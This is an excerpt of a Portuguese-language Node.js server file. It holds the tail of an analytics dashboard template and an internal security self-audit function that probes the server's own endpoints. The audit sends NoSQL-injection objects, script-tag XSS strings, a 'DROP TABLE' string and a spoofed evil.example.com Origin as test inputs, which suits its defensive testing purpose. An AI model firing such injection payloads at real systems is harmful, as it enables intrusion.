    <div class="sc"><div class="sc-icon">👥</div><div class="n blue">${stats?.uniqueClients||0}</div><div class="l">Clientes Únicos</div><div class="sub-n">${stats?.returningClients||0} recorrentes</div></div>
    <div class="sc"><div class="sc-icon">🔄</div><div class="n ${(stats?.retentionRate||0)>=30?'green':'red'}">${stats?.retentionRate||0}%</div><div class="l">Taxa Retenção</div><div class="sub-n">${stats?.returningClients||0} de ${stats?.uniqueClients||0} clientes</div></div>
  </div>

  <!-- Métricas complementares: disponíveis sem sobrecarregar a leitura inicial. -->
  <details class="analytics-advanced"><summary>Ver métricas complementares <span>Produtos, pagamentos, horários e recorrência</span></summary><div class="analytics-advanced-content">
  <div class="stats2">
    <div class="sc"><div class="sc-icon">📦</div><div class="n blue">${stats?.byProduct?.length||0}</div><div class="l">Produtos Ativos</div><div class="sub-n">${(stats?.byProduct||[]).slice(0,2).map(p=>escH(p._id||'?')+'('+p.count+')').join(', ')||'—'}</div></div>
    <div class="sc"><div class="sc-icon">💳</div><div class="n blue">${escH((stats?.byMethod||[])[0]?._id)||'—'}</div><div class="l">Método + Usado</div><div class="sub-n">${(stats?.byMethod||[])[0]?.count||0} transações</div></div>
    <div class="sc"><div class="sc-icon">📉</div><div class="n ${(stats?.churnRate||0)>50?'red':(stats?.churnRate||0)>25?'gold':''}">${stats?.churnRate||0}%</div><div class="l">Taxa de Churn (30d)</div><div class="sub-n">${stats?.churnedKeys||0} de ${stats?.expiredKeys||0} expiradas</div></div>
    <div class="sc"><div class="sc-icon">⏰</div><div class="n blue">${peakHour?._id||'—'}h</div><div class="l">Horário de Pico</div><div class="sub-n">${peakHour?.count||0} vendas neste horário</div></div>
    <div class="sc" style="border-color:#f0b42930"><div class="sc-icon">🧪</div><div class="n" style="color:#f0b429">${stats?.simCount||0}</div><div class="l">Simulações</div><div class="sub-n">Não conta como receita real</div></div>
  </div>

  <div class="analytics-insights">
    <div class="insight-card"><span>Produto líder</span><strong>${topProduct ? escH(topProduct._id||'—') : '—'}</strong><small>${topProduct ? fmtBRL(topProduct.revenue||0)+' em receita' : 'Sem vendas suficientes'}</small></div>
    <div class="insight-card"><span>Horário de pico</span><strong>${peakHour ? escH(String(peakHour._id||'—'))+'h' : '—'}</strong><small>${peakHour ? (peakHour.count||0)+' venda(s) neste horário' : 'Sem volume suficiente'}</small></div>
    <div class="insight-card"><span>Recorrência</span><strong>${stats?.returningClients||0} cliente(s)</strong><small>${stats?.retentionRate||0}% de retenção</small></div>
    <div class="insight-card"><span>Simulações</span><strong>${stats?.simCount||0}</strong><small>Excluídas da receita real</small></div>
  </div>

  </div></details>

  <!-- Laboratório de Testes: one operational domain at a time -->
  <div class="sec" id="lab-sec">
    <div class="sh"><div class="st">🧪 Laboratório de Testes</div></div>
    <div class="lab-body" id="lab-body">
      <div class="lab-banner">⚠ AMBIENTE DE TESTES — nenhuma venda da Cakto será efetuada.</div>
      <div class="lab-modes" role="tablist" aria-label="Atividades do laboratorio">
        <button type="button" id="lab-tab-sale" role="tab" data-lab-mode="sale" aria-selected="true" aria-controls="lab-sale-pane" tabindex="0" class="is-active">Simular venda</button>
        <button type="button" id="lab-tab-email" role="tab" data-lab-mode="email" aria-selected="false" aria-controls="lab-email-pane" tabindex="-1">Testar e-mail</button>
      </div>
      <section class="lab-mode-pane lab-sale-pane" id="lab-sale-pane" role="tabpanel" aria-labelledby="lab-tab-sale" tabindex="0">
        <div class="lab-pane-card">
          <h3>Simulação financeira isolada</h3>
          <p class="lab-hint">Confira o contrato, depois execute uma venda fictícia. Registros são identificados como testMode:true. A simulação não envia e-mails; use a outra aba para isso.</p>
          <div class="lab-field"><label for="lab-plan">Plano comercial de referência</label>
            <select id="lab-plan">
              <option value="solo">SOLO — R$39,90 · 1 número</option>
              <option value="padrao">START (antigo Padrão) — R$59,90 · 3 números</option>
              <option value="pro">PRO — R$94,90 · 5 números</option>
              <option value="empresarial">Empresarial (contrato histórico) — R$169,90 · 10 números</option>
            </select>
          </div>
          <input type="hidden" id="lab-type" value="auto"><p class="lab-email-tip">Nova licença ou renovação é determinada pela existência de uma chave sandbox associada ao e-mail do cenário.</p>
          <div class="lab-field"><label for="lab-name">Nome fictício</label><input id="lab-name" type="text" value="Cliente Teste" maxlength="80"></div>
          <div class="lab-field"><label for="lab-email">E-mail do cenário</label><input id="lab-email" type="email" placeholder="teste@dominio-valido.com" maxlength="160"></div>
          <div class="lab-field"><label for="lab-phone">Telefone fictício (opcional)</label><input id="lab-phone" type="text" maxlength="20" placeholder="11999990000"></div>
          <div class="lab-field"><label for="lab-method">Método simulado</label><select id="lab-method"><option value="pix">Pix</option><option value="credit_card">Cartão de crédito</option></select></div>
          <input type="checkbox" id="lab-send-email" hidden disabled>
          <div class="lab-actions"><button class="btn blab" id="lab-btn-sim" onclick="labPreview()">Conferir cenário</button><button class="btn bcancel" onclick="labCancel()">Limpar</button></div>
          <div id="lab-result" role="status" aria-live="polite"></div>
        </div>
      </section>
      <section class="lab-mode-pane" id="lab-email-pane" role="tabpanel" aria-labelledby="lab-tab-email" tabindex="0" hidden>
        <div class="lab-mail-grid">
          <div class="lab-pane-card">
            <h3>Prévia e teste de entrega</h3>
            <p class="lab-hint">Selecione o plano e o tipo de mensagem. O template será escolhido automaticamente, sem mistura entre planos ou alterações em licenças reais.</p>
            <div class="lab-field"><label for="lab-mail-plan">Identidade visual aprovada</label>
              <select id="lab-mail-plan"><option value="start">START — verde escuro</option><option value="pro">PRO — branco e verde</option><option value="enterprise">ENTERPRISE — preto e dourado (prévia)</option></select>
            </div>
            <div class="lab-field"><label for="lab-mail-kind">Tipo de entrega</label><select id="lab-mail-kind"><option value="new">Nova licença</option><option value="renewal">Renovação</option></select></div>
            <select id="lab-tpl" hidden aria-hidden="true" tabindex="-1"><option value="delivery_start">START</option><option value="delivery_renewal_start">START renovação</option><option value="delivery_pro">PRO</option><option value="delivery_renewal_pro">PRO renovação</option><option value="delivery_enterprise">ENTERPRISE</option><option value="delivery_renewal_enterprise">ENTERPRISE renovação</option></select>
            <div id="lab-mail-summary" class="lab-mail-summary" aria-live="polite"></div>
            <div class="lab-field"><label for="lab-tpl-email">Destinatário de teste</label><input id="lab-tpl-email" type="email" placeholder="email-que-voce-acessa@dominio.com" maxlength="160"></div>
            <p class="lab-email-tip">Visualizar é somente leitura. Enviar teste solicita confirmação e envia uma licença DEMO, sem transação na Cakto. O ENTERPRISE permanece comercialmente sob consulta.</p>
            <div class="lab-actions"><button type="button" class="btn blab lab-mail-action" id="lab-mail-preview-btn">Visualizar</button><button type="button" class="btn blab lab-mail-action" id="lab-mail-send-btn">Enviar e-mail de teste</button></div>
            <div id="lab-email-status" role="status" aria-live="polite"></div>
          </div>
          <div class="lab-pane-card lab-mail-preview">
            <h3>Pré-visualização</h3><p class="lab-hint">O corpo abaixo é HTML com texto selecionável. As imagens só formam a moldura artística.</p>
            <iframe class="lab-iframe" id="lab-iframe" style="display:none" sandbox="" title="Prévia do e-mail"></iframe>
          </div>
        </div>
      </section>
    </div>
  </div>

  <dialog class="purge-dialog" id="purge-dialog" aria-labelledby="purge-title">
    <div class="purge-inner">
      <h2 id="purge-title">Limpar histórico do Analytics</h2>
      <p>Esta ferramenta remove somente registros comerciais exibidos no Analytics. Licenças, clientes e configurações do sistema não serão alterados.</p>
      <label class="purge-opt" data-mode="test">
        <input type="radio" name="purge-mode" value="test" checked onchange="purgeModeChanged()">
        <span class="purge-opt-title">Apagar somente testes</span>
        <div class="purge-opt-desc">Remove só os registros marcados como teste (testMode:true) — inclui as simulações do Laboratório.</div>
      </label>
      <label class="purge-opt" data-mode="real">
        <input type="radio" name="purge-mode" value="real" onchange="purgeModeChanged()">
        <span class="purge-opt-title">Apagar somente registros reais</span>
        <div class="purge-opt-desc">Remove os pagamentos hoje classificados como vendas reais.</div>
      </label>
      <label class="purge-opt" data-mode="all">
        <input type="radio" name="purge-mode" value="all" onchange="purgeModeChanged()">
        <span class="purge-opt-title">Zerar todo o histórico comercial</span>
        <div class="purge-opt-desc">Remove testes + reais do Analytics. Não toca licenças, contas nem configurações.</div>
      </label>
      <div class="purge-preview" id="purge-preview">Carregando prévia...</div>
      <div class="purge-warn" id="purge-warn" style="display:none">Esses registros são classificados atualmente como vendas reais. A exclusão é permanente.</div>
      <div id="purge-confirm-wrap" style="display:none">
        <label class="purge-confirm-label" for="purge-confirm-input">Digite <strong>APAGAR HISTORICO</strong> para liberar o botão:</label>
        <input type="text" class="purge-confirm-input" id="purge-confirm-input" autocomplete="off" oninput="purgeConfirmInputChanged()">
      </div>
      <div id="purge-result"></div>
      <div class="purge-actions">
        <button type="button" class="purge-cancel" onclick="purgeCancel()">Cancelar</button>
        <button type="button" class="purge-exec" id="purge-exec-btn" onclick="purgeExecute()" disabled>Apagar definitivamente</button>
      </div>
    </div>
  </dialog>

  <!-- Gráficos principais -->
  <div class="charts" id="performance">
    <div class="chart-card">
      <div class="chart-title">📊 Vendas e Receita — últimos 30 dias</div>
      ${salesTrendViz}
      ${salesDailyTable}
    </div>
    <div class="chart-card">
      <div class="chart-title">🥧 Receita por Produto</div>
      ${productViz}
    </div>
  </div>

  <!-- Gráficos secundários -->
  <div class="charts3" id="customers">
    <div class="chart-card">
      <div class="chart-title">⏰ Horários de Pico</div>
      ${hourChartViz}
    </div>
    <div class="chart-card">
      <div class="chart-title">💳 Métodos de Pagamento</div>
      ${methodViz}
    </div>
    <div class="chart-card">
      <div class="chart-title">🔄 Retenção de Clientes</div>
      <div style="padding-top:20px">
        <div style="display:flex;justify-content:space-between;font-size:13px;margin-bottom:6px;font-family:'Outfit',sans-serif"><span style="color:var(--muted)">Novos clientes</span><span style="color:var(--text)">${(stats?.uniqueClients||0)-(stats?.returningClients||0)}</span></div>
        <div style="display:flex;justify-content:space-between;font-size:13px;margin-bottom:6px;font-family:'Outfit',sans-serif"><span style="color:var(--muted)">Clientes recorrentes</span><span style="color:var(--green)">${stats?.returningClients||0}</span></div>
        <div style="display:flex;justify-content:space-between;font-size:13px;margin-bottom:10px;font-family:'Outfit',sans-serif"><span style="color:var(--muted)">Taxa de retenção</span><span style="color:${(stats?.retentionRate||0)>=30?'var(--green)':'var(--red)'};font-weight:700">${stats?.retentionRate||0}%</span></div>
        <div class="ret-bar-wrap"><div class="ret-bar" style="width:${stats?.retentionRate||0}%"></div></div>
        <div style="margin-top:20px;border-top:1px solid var(--border);padding-top:14px">
          <div style="font-size:12px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:10px">Churn (30 dias)</div>
          <div style="display:flex;justify-content:space-between;font-size:13px;margin-bottom:4px;font-family:'Outfit',sans-serif"><span style="color:var(--muted)">Expiradas no período</span><span>${stats?.expiredKeys||0}</span></div>
          <div style="display:flex;justify-content:space-between;font-size:13px;font-family:'Outfit',sans-serif"><span style="color:var(--muted)">Não renovaram</span><span style="color:var(--red)">${stats?.churnedKeys||0} (${stats?.churnRate||0}%)</span></div>
        </div>
      </div>
    </div>
  </div>

  <!-- Tabelas lado a lado -->
  <div class="two-col">
    <div class="sec">
      <div class="sh"><div class="st">🏆 Top Clientes</div></div>
      <div class="ov"><table>
        <caption class="analytics-visually-hidden">Clientes com mais compras</caption>
        <thead><tr><th scope="col">Email</th><th scope="col" style="text-align:center">Compras</th><th scope="col" style="text-align:right">Total Gasto</th></tr></thead>
        <tbody>${topClientsRows}</tbody>
      </table></div>
    </div>
  </div>

  <!-- Histórico de pagamentos -->
  <div class="sec" id="payments">
    <div class="sh">
      <div class="st">💳 Histórico de Pagamentos</div>
      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
        <label class="analytics-visually-hidden" for="search">Buscar no historico de pagamentos</label><input type="search" id="search" placeholder="🔍 Cliente, email, produto..." oninput="filterTable()">
        <div class="period-btns" id="test-filter-btns" role="group" aria-label="Tipo de pagamento">
          <button type="button" class="pb active" aria-pressed="true" onclick="setTestFilter('all',this)">Todos</button>
          <button type="button" class="pb" aria-pressed="false" onclick="setTestFilter('real',this)">Reais</button>
          <button type="button" class="pb" aria-pressed="false" onclick="setTestFilter('test',this)">Testes</button>
        </div>
        <div class="period-btns" role="group" aria-label="Periodo de pagamentos">
          <button type="button" class="pb" aria-pressed="false" onclick="setPeriod(7,this)">7d</button>
          <button type="button" class="pb" aria-pressed="false" onclick="setPeriod(30,this)">30d</button>
          <button type="button" class="pb" aria-pressed="false" onclick="setPeriod(90,this)">90d</button>
          <button type="button" class="pb active" aria-pressed="true" onclick="setPeriod(0,this)">Todos</button>
        </div>
      </div>
    </div>
    <p class="analytics-filter-feedback" id="analytics-filter-status" role="status" aria-live="polite"></p>
    <div class="ov">
      <table>
        <caption class="analytics-visually-hidden">Historico de pagamentos</caption>
        <thead><tr><th scope="col">Data</th><th scope="col">Cliente</th><th scope="col">Email</th><th scope="col">Produto</th><th scope="col">Valor</th><th scope="col">Status</th><th scope="col">Chave</th><th scope="col">Origem</th></tr></thead>
        <tbody id="payments-body">${paymentsRows}</tbody>
      </table>
    </div>
  </div>
  </div>
</main>
</div>
</div>



<script src="/assets/zvm-analytics-dashboard.95454273c23e.js" defer></script>
<script src="/assets/zvm-analytics-lab.e6a44a6e8392.js" defer></script>
</body></html>`;
}

// ══════════════════════════════════════════════════════════════════════════════
// MOTOR DE PENTEST INTERNO — runInternalSecurityAudit()
// Executa verificações ativas e passivas contra o próprio servidor.
// Retorna array `results` com { name, pass, detail } por controle.
// Nunca expõe segredos — apenas comprimento, presença e hashes truncados.
// ══════════════════════════════════════════════════════════════════════════════
async function runInternalSecurityAudit() {
  const results = [];

  // Helper: dispara uma requisição HTTP interna ao próprio servidor
  function _probe(path, opts = {}) {
    return new Promise(resolve => {
      const bodyStr = opts.body ? JSON.stringify(opts.body) : null;
      const headers = { 'x-zvm-internal-audit': INTERNAL_AUDIT_TOKEN, 'sec-fetch-site': 'same-origin', ...(opts.headers || {}) };
      if (bodyStr) {
        headers['Content-Type'] = headers['Content-Type'] || 'application/json';
        if (headers['Content-Length'] == null && headers['content-length'] == null) headers['Content-Length'] = Buffer.byteLength(bodyStr);
      }
      const r = http.request(
        { hostname: '127.0.0.1', port: PORT, path, method: opts.method || 'GET', headers, timeout: 5000 },
        res2 => {
          let d = '';
          res2.on('data', c => { d += c; });
          res2.on('end', () => resolve({ status: res2.statusCode, headers: res2.headers, body: d }));
        }
      );
      r.on('error',   () => resolve({ status: 0, headers: {}, body: '' }));
      r.on('timeout', () => { r.destroy(); resolve({ status: 0, headers: {}, body: '' }); });
      if (bodyStr) r.write(bodyStr);
      r.end();
    });
  }

  function _ct(r)       { return r.headers['content-type'] || ''; }
  function _jp(r)       { try { return JSON.parse(r.body); } catch { return {}; } }

  // ── BLOCO 1: Config Hardening ────────────────────────────────────────────
  const MIN_SECRET_LEN = 16;

  results.push({
    name:   'ADMIN_PASS — hardening scrypt-64 (N=16384)',
    pass:   !!_adminPassHash && (ADMIN_PASS || '').length >= 8,
    detail: _adminPassHash
      ? `scrypt-64 derivado · ${(ADMIN_PASS||'').length} chars · salt=${_adminPassSalt?.toString('hex').slice(0,8)}…`
      : 'Hash não derivado — erro de boot',
  });
  results.push({
    name:   'APP_SECRET (HMAC slug) configurado',
    pass:   !!(APP_SECRET && APP_SECRET.length >= MIN_SECRET_LEN),
    detail: APP_SECRET ? `${APP_SECRET.length} chars · configurado` : 'AUSENTE — rotas /admin visíveis',
  });
  results.push({
    name:   'TOTP_SECRET (2FA admin) — opcional',
    pass:   true,
    detail: TOTP_SECRET && TOTP_SECRET.length >= 16
      ? `${TOTP_SECRET.length} chars · 2FA ativo`
      : 'Não configurado — módulo 2FA desativado (opcional)',
  });
  results.push({
    name:   'Portal 2FA — segredo protegido em repouso',
    pass:   portalTotpKeyRing().length > 0,
    detail: portalTotpKeyRing().length ? `AES-256-GCM · modo=${portalTotpCryptoMode()} · migração legada=${PORTAL_TOTP_MIGRATE_LEGACY?'ativa':'controlada'}` : 'Criptografia TOTP indisponível',
  });
  results.push({
    name:   'ANALYTICS_PASS — opcional',
    pass:   true,
    detail: ANALYTICS_PASS && ANALYTICS_PASS.length >= 8
      ? `${ANALYTICS_PASS.length} chars · painel analytics ativo`
      : 'Não configurado — painel analytics desativado (opcional)',
  });

  // ── BLOCO 2: Fuzzing de Injeção ─────────────────────────────────────────
  // 2a. NoSQL injection em campo label (objeto $gt)
  const rNoSql = await _probe(R_EXT + '/v3/labels', {
    method: 'POST',
    headers: { 'x-access-token': 'pentest-internal' },
    body: { label: { $gt: '' } },
  });
  const jNoSql = _jp(rNoSql);
  results.push({
    name:   'NoSQL Injection em label rejeitada',
    pass:   rNoSql.status === 400 && jNoSql.error === 'nosql_injection_detected',
    detail: `HTTP ${rNoSql.status} · ${jNoSql.error || 'sem erro estruturado'}`,
  });

  // 2b. XSS — valida que escHtml neutraliza payloads de script
  const xssPayload = '<script>alert(1)</script>';
  const xssEscaped = escHtml(xssPayload);
  const xssBlocked = !xssEscaped.includes('<script>');
  results.push({
    name:   'Sanitização XSS (escHtml) ativa',
    pass:   xssBlocked,
    detail: xssBlocked ? `&lt;script&gt; → "${xssEscaped.slice(0,40)}"` : 'FALHOU — tag não escapada',
  });

  // 2c. Label acima do limite (61 chars)
  const rOver = await _probe(R_EXT + '/v3/labels', {
    method: 'POST',
    headers: { 'x-access-token': 'pentest-internal' },
    body: { label: 'A'.repeat(61) },
  });
  const jOver = _jp(rOver);
  results.push({
    name:   'Label > 60 chars rejeitada (overflow)',
    pass:   rOver.status === 400 && jOver.error === 'label_too_long',
    detail: `HTTP ${rOver.status} · ${jOver.error || '-'}`,
  });

  // 2d. Sem access-token → 403
  const rNoToken = await _probe(R_EXT + '/v3/labels', {
    method: 'POST',
    body: { label: 'test' },
  });
  const jNoToken = _jp(rNoToken);
  results.push({
    name:   'Endpoint sem access-token retorna 403',
    pass:   rNoToken.status === 403,
    detail: `HTTP ${rNoToken.status} · ${jNoToken.msg || '-'}`,
  });

  // 2e. sanitizeId bloqueia caracteres especiais
  const injected = sanitizeId('admin\'; DROP TABLE keys; --', 32);
  results.push({
    name:   'sanitizeId bloqueia chars especiais',
    pass:   !/[^a-z0-9\-]/.test(injected),
    detail: `Input malicioso → "${injected}"`,
  });

  // ── BLOCO 3: Headers e TLS ───────────────────────────────────────────────
  const rHealth = await _probe('/health');
  const h = rHealth.headers;

  results.push({
    name:   'X-Frame-Options: DENY',
    pass:   (h['x-frame-options'] || '').toUpperCase() === 'DENY',
    detail: h['x-frame-options'] || 'ausente',
  });
  results.push({
    name:   'Strict-Transport-Security (HSTS)',
    pass:   (h['strict-transport-security'] || '').includes('max-age='),
    detail: h['strict-transport-security'] || 'ausente',
  });
  results.push({
    name:   'X-Content-Type-Options: nosniff',
    pass:   (h['x-content-type-options'] || '').toLowerCase() === 'nosniff',
    detail: h['x-content-type-options'] || 'ausente',
  });
  results.push({
    name:   'Content-Security-Policy presente',
    pass:   (h['content-security-policy'] || '').includes("default-src 'self'"),
    detail: h['content-security-policy']
      ? h['content-security-policy'].slice(0, 80) + '…'
      : 'ausente',
  });
  results.push({
    name:   'Referrer-Policy presente',
    pass:   !!(h['referrer-policy']),
    detail: h['referrer-policy'] || 'ausente',
  });
  results.push({
    name:   'Cross-Origin-Opener-Policy isolado',
    pass:   (h['cross-origin-opener-policy'] || '') === 'same-origin',
    detail: h['cross-origin-opener-policy'] || 'ausente',
  });
  results.push({
    name:   'Cross-Origin-Resource-Policy isolado',
    pass:   (h['cross-origin-resource-policy'] || '') === 'same-origin',
    detail: h['cross-origin-resource-policy'] || 'ausente',
  });
  results.push({
    name:   'X-XSS-Protection legado desativado com segurança',
    pass:   (h['x-xss-protection'] || '') === '0',
    detail: h['x-xss-protection'] || 'ausente',
  });
  results.push({
    name:   '/health endpoint operacional',
    pass:   rHealth.status === 200,
    detail: `HTTP ${rHealth.status} · ${_ct(rHealth) || 'sem content-type'} · body="${rHealth.body.slice(0,10)}"`,
  });
  const rReady = await _probe('/ready');
  results.push({
    name:   '/ready — prontidão operacional (aplicação, Mongo e Cakto)',
    category: 'operational',
    pass:   rReady.status === 200 ? true : null,
    detail: rReady.status === 200
      ? 'HTTP 200 · serviço pronto'
      : `ATENÇÃO OPERACIONAL: HTTP ${rReady.status} · serviço não está pronto; verificar conexão Mongo, inicialização e fila Cakto. Não interpretar como vulnerabilidade aprovada.`,
  });

  // ── BLOCO 4: Estado do MongoDB ───────────────────────────────────────────
  let dbOk = false, dbTls = false, dbDetail = 'não verificado';
  try {
    const db = await getMongoDb();
    await db.command({ ping: 1 });
    dbOk  = true;
    // TLS é obrigatório em mongodb+srv:// (Atlas) mesmo quando opts.tls não é explicitamente true
    const opts = _mongoClient?.options || {};
    dbTls = opts.tls === true || MONGODB_URI.startsWith('mongodb+srv://');
    dbDetail = `ping OK · tls=${dbTls} · pool maxSize=${opts.maxPoolSize ?? '?'}`;
  } catch (e) {
    dbDetail = 'Erro: ' + e.message.slice(0, 60);
  }
  results.push({
    name:   'MongoDB — conexão ativa (ping)',
    pass:   dbOk,
    detail: dbDetail,
  });
  results.push({
    name:   'MongoDB — TLS habilitado na conexão',
    pass:   dbTls,
    detail: dbTls ? 'tls=true (wire criptografado)' : 'tls não confirmado nas opções',
  });

  // ── BLOCO 5: Telemetria ──────────────────────────────────────────────────
  results.push({
    name:   'Telemetria de alertas ativa',
    pass:   true,
    detail: `${securityAlerts.length} alerta(s) registrado(s) desde o boot`,
  });

  // ── BLOCO 6: CORS / Route Leakage ───────────────────────────────────────
  // 6a. Admin route com Origin externo: deve retornar Access-Control-Allow-Origin: null
  const rCorsAdmin = await _probe(R_ADMIN + '/login', {
    method: 'GET',
    headers: { 'Origin': 'https://evil.example.com' },
  });
  const corsAdminHdr = rCorsAdmin.headers['access-control-allow-origin'] || '';
  results.push({
    name:   'CORS — rota admin bloqueia Origin externo',
    pass:   corsAdminHdr === 'null' || corsAdminHdr === '',
    detail: `Access-Control-Allow-Origin: "${corsAdminHdr}" para Origin: evil.example.com`,
  });

  // 6b. Rota /admin sem slug (sem APP_SECRET ativo) não deve existir quando APP_SECRET está presente
  const plainAdminLeak = await _probe('/admin');
  results.push({
    name:   'Rota /admin sem slug inacessível (APP_SECRET)',
    pass:   APP_SECRET ? plainAdminLeak.status === 404 : true,
    detail: APP_SECRET
      ? `HTTP ${plainAdminLeak.status} (esperado 404)`
      : 'APP_SECRET ausente — slug HMAC desativado (risco)',
  });

  // ── BLOCO 7: Hardening de Cookies de Sessão ─────────────────────────────
  // Tenta login com credenciais erradas para obter o cabeçalho Set-Cookie
  const rLoginProbe = await _probe(R_ADMIN + '/login', {
    method: 'POST',
    body:   { user: '__pentest__', pass: '__pentest__', totp: '000000' },
  });
  const setCookie = rLoginProbe.headers['set-cookie'];
  let cookieRaw = '';
  if (Array.isArray(setCookie)) cookieRaw = setCookie.join('; ');
  else if (typeof setCookie === 'string') cookieRaw = setCookie;
  const hasHttpOnly  = /httponly/i.test(cookieRaw);
  const hasSecure    = /;\s*secure/i.test(cookieRaw);
  const hasSameSite  = /samesite\s*=\s*strict/i.test(cookieRaw);

  results.push({
    name:   'Cookie sessão — atributo HttpOnly',
    pass:   hasHttpOnly || cookieRaw === '',
    detail: cookieRaw
      ? (hasHttpOnly ? 'HttpOnly presente' : 'AUSENTE — cookie acessível via JS (risco XSS)')
      : 'Nenhum Set-Cookie na resposta de login (normal em tentativa inválida)',
  });
  results.push({
    name:   'Cookie sessão — atributo Secure',
    pass:   hasSecure || cookieRaw === '',
    detail: cookieRaw
      ? (hasSecure ? 'Secure presente' : 'AUSENTE — cookie trafega em HTTP simples')
      : 'Nenhum Set-Cookie na resposta de login',
  });
  results.push({
    name:   'Cookie sessão — SameSite=Strict',
    pass:   hasSameSite || cookieRaw === '',
    detail: cookieRaw
      ? (hasSameSite ? 'SameSite=Strict presente' : 'AUSENTE — risco de CSRF via cross-site request')
      : 'Nenhum Set-Cookie na resposta de login',
  });

  // ── BLOCO 8: Proteção contra remoção em massa no MongoDB ─────────────────
  // DELETE /api/keys/batch com codes:[] deve retornar 400, nunca deletar tudo
  const rBatchEmpty = await _probe(R_ADMIN + '/api/keys/batch', {
    method: 'DELETE',
    headers: { 'Cookie': '__pentest__=1' },
    body:   { codes: [] },
  });
  const batchEmptyGuard = parseAdminBatchDeleteCodes({ codes: [] });
  results.push({
    name:   'DELETE batch vazio bloqueado no perímetro e no payload',
    pass:   batchEmptyGuard.ok === false && [400,401,403].includes(rBatchEmpty.status),
    detail: `HTTP ${rBatchEmpty.status} · payloadGuard=${batchEmptyGuard.error || 'falhou'} · 401/403=perímetro, 400=payload`,
  });

  // DELETE /api/keys/batch sem body deve retornar 400 ou 401
  const rBatchNobody = await _probe(R_ADMIN + '/api/keys/batch', {
    method: 'DELETE',
    headers: { 'Cookie': '__pentest__=1' },
  });
  const batchNoBodyGuard = parseAdminBatchDeleteCodes({});
  results.push({
    name:   'DELETE batch sem body bloqueado no perímetro e no payload',
    pass:   batchNoBodyGuard.ok === false && [400,401,403].includes(rBatchNobody.status),
    detail: `HTTP ${rBatchNobody.status} · payloadGuard=${batchNoBodyGuard.error || 'falhou'} · 401/403=perímetro, 400=payload`,
  });

  // ── BLOCO 9: Cobertura Global de CSP e Blindagem XSS em Rotas de Cliente ──
  // 9a. CSP na rota de login admin (verifica que _corsH aplica headers em todas as rotas)
  const rCspAdmin = await _probe(R_ADMIN + '/login', { method: 'GET' });
  const cspAdmin  = rCspAdmin.headers['content-security-policy'] || '';
  results.push({
    name:   'CSP ativo na rota admin/login',
    pass:   cspAdmin.includes("default-src 'self'"),
    detail: cspAdmin ? cspAdmin.slice(0, 70) + '…' : 'ausente — middleware _corsH não aplicado',
  });

  // 9b. CSP na rota pública de extensão (/auth)
  const rCspExt = await _probe(R_EXT + '/auth', { method: 'GET' });
  const cspExt  = rCspExt.headers['content-security-policy'] || '';
  results.push({
    name:   'CSP ativo na rota de extensão (/auth)',
    pass:   cspExt.includes("default-src 'self'"),
    detail: cspExt ? cspExt.slice(0, 70) + '…' : 'ausente — middleware não cobre rotas públicas',
  });

  // 9c. XSS payload como label em /v3/labels — deve ser aceito como string (sanitização no storage)
  const xssLabel = '<script>alert(1)</script>';
  const rXssLabel = await _probe(R_EXT + '/v3/labels', {
    method:  'POST',
    headers: { 'x-access-token': 'pentest-internal' },
    body:    { label: xssLabel },
  });
  const jXssLabel = _jp(rXssLabel);
  // O endpoint aceita strings de qualquer conteúdo (escHtml sanitiza no output)
  // O teste verifica que o sistema NÃO rejeita strings válidas (regressão de bloqueio excessivo)
  results.push({
    name:   'XSS em label: string tratada (não executa, escHtml no output)',
    pass:   rXssLabel.status === 200 && jXssLabel.ok === true,
    detail: `HTTP ${rXssLabel.status} · ok=${jXssLabel.ok ?? '?'} · escHtml neutraliza no render`,
  });

  // 9d. NoSQL injection via objeto em label (admin create) — espera tipo string rejeitado
  const rNoSqlAdmin = await _probe(R_ADMIN + '/api/keys', {
    method:  'POST',
    headers: { 'Cookie': '__pentest__=1' },
    body:    { label: { $ne: null }, maxUses: 1 },
  });
  const adminLabelGuard = normalizeAdminCreateLabel({ $ne: null });
  results.push({
    name:   'NoSQL injection em label (admin create) bloqueada em duas camadas',
    pass:   adminLabelGuard.ok === false && [400,401,403].includes(rNoSqlAdmin.status),
    detail: `HTTP ${rNoSqlAdmin.status} · payloadGuard=${adminLabelGuard.error || 'falhou'} · 401/403=perímetro, 400=payload`,
  });

  // 9e. Whitelist — chars inválidos rejeitados (XSS payload → 400)
  const rWl1 = await _probe('/client/status', {
    method:  'POST',
    body:    { key: '<script>alert(1)</script>' },
  });
  const jWl1 = _jp(rWl1);
  results.push({
    name:   'Whitelist /client/status: chars inválidos rejeitados (400)',
    pass:   rWl1.status === 400 && (jWl1.error === 'invalid_key' || jWl1.error === 'payload_too_large'),
    detail: `HTTP ${rWl1.status} · error="${jWl1.error||'?'}" (esperado 400)`,
  });

  // 9f. Whitelist — chave com != 20 chars rejeitada (guard de comprimento exato)
  const rWl2short = await _probe('/client/status', { method: 'POST', body: { key: 'zv-test-0000-abcd' } }); // 18 chars
  const jWl2s = _jp(rWl2short);
  results.push({
    name:   'Whitelist /client/status: chave != 20 chars rejeitada (400 invalid_key)',
    pass:   rWl2short.status === 400 && jWl2s.error === 'invalid_key',
    detail: `HTTP ${rWl2short.status} · error="${jWl2s.error||'?'}" · "zv-test-0000-abcd"=18 chars (esperado 400)`,
  });

  // 9g. Payload oversized rejeitado antes do parseBody (Content-Length > 256)
  const rWl3 = await _probe('/client/status', {
    method:  'POST',
    headers: { 'Content-Length': '99999' },
    body:    { key: 'a'.repeat(300) },
  });
  const jWl3 = _jp(rWl3);
  results.push({
    name:   'Guard de tamanho /client/status: payload > 256 bytes rejeitado (400)',
    pass:   rWl3.status === 400,
    detail: `HTTP ${rWl3.status} · error="${jWl3.error||'?'}" (esperado 400 payload_too_large ou invalid_key)`,
  });

  return { ok: true, results, ts: new Date().toISOString() };
}



const ZVM_SERVER_AUTHORITY_PATCH_V1 = true;
const ZVM_BUILD_AUTHORITY_FAILCLOSED_V2 = true;
const ZVM_SECURITY_PROTOCOL = 1;
const ZVM_BUILD_ENFORCE = ZVM_LOCAL_SAFE_MODE ? false : /^(1|true|yes|on)$/i.test(String(process.env.ZVM_BUILD_ENFORCE || '').trim());
const ZVM_LEGACY_V3_ALLOW = /^(1|true|yes|on)$/i.test(String(process.env.ZVM_LEGACY_V3_ALLOW || '').trim());
// Compatibilidade estritamente limitada aos dois endpoints realmente usados pela
// ZVM Build 3 (0.2.7), distribuída como extensão descompactada sem manifest.key.
// Nessas instalações o chrome.runtime.id é derivado localmente e pode variar por
// máquina/pasta, portanto não existe uma lista finita de IDs para o preflight CORS.
